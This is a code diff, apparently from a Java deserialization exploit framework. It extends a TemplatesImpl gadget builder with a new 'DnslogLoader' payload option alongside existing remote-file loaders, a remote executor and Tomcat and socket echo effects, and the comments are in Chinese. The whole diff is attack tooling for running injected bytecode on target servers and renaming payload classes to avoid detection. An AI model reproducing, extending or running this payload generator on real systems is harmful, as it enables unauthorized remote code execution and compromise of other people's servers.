@@ -10,6 +10,7 @@ import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
 import echo.SocketEchoPayload;
 import echo.TomcatEchoPayload;
 import javassist.*;
+import loader.DnslogLoader;
 import loader.RemoteFileHttpExecutor;
 import loader.RemoteFileHttpLoader;
 import loader.RemoteFileLoader;
@@ -58,7 +59,9 @@ public class TemplatesImplBullet implements Bullet<Object> {
 
     @NotNull
     @Require(name = "effect", type = "string", detail="选择载入payload的效果，" +
-                                                      "可选default、TomcatEcho、SocketEcho、RemoteFileLoader、RemoteFileHttpLoader、RemoteFileHttpExecutor")
+                                                      "可选default、" +
+            "TomcatEcho、SocketEcho、RemoteFileLoader、" +
+            "RemoteFileHttpLoader、RemoteFileHttpExecutor、DnslogLoader")
     private String effect = "default";
 
     @Require(name = "exception", type = "boolean", detail = "是否需要以抛异常的方式返回执行结果，默认为false")
@@ -131,6 +134,11 @@ public class TemplatesImplBullet implements Bullet<Object> {
             code = "url=\""+remote[0]+"\";\nos=\""+remote[1]+"\";";
             pool.appendClassPath(new ClassClassPath(RemoteFileHttpExecutor.class));
             cc = pool.getCtClass(RemoteFileHttpExecutor.class.getName());
+            cc.setName("Loader"+System.currentTimeMillis());
+        }else if("DnslogLoader".equals(effect)){
+            code = "dnslog=\""+body+"\";";
+            pool.appendClassPath(new ClassClassPath(DnslogLoader.class));
+            cc = pool.getCtClass(DnslogLoader.class.getName());
             cc.setName("Loader"+System.currentTimeMillis());
         }
 
